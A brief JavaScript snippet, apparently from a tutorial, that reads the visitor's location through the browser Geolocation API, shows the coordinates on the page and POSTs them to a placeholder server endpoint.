    <script>         function getLocation() {             if (navigator.geolocation) {                 navigator.geolocation.getCurrentPosition(showPosition);

            }

        }

 

        function showPosition(position) {             var lat = position.coords.latitude;             var lon = position.coords.longitude;             var message = "Latitude: " + lat + "<br>Longitude: " + lon;             document.getElementById("demo").innerHTML = message;

            // Send the coordinates to your server             fetch('https://your-server-endpoint.com/save-location', {                 method: 'POST',                 headers: {

                    'Content-Type': 'application/json'

                },

                body: JSON.stringify({ latitude: lat, longitude: lon })

            });

        }

    </script>
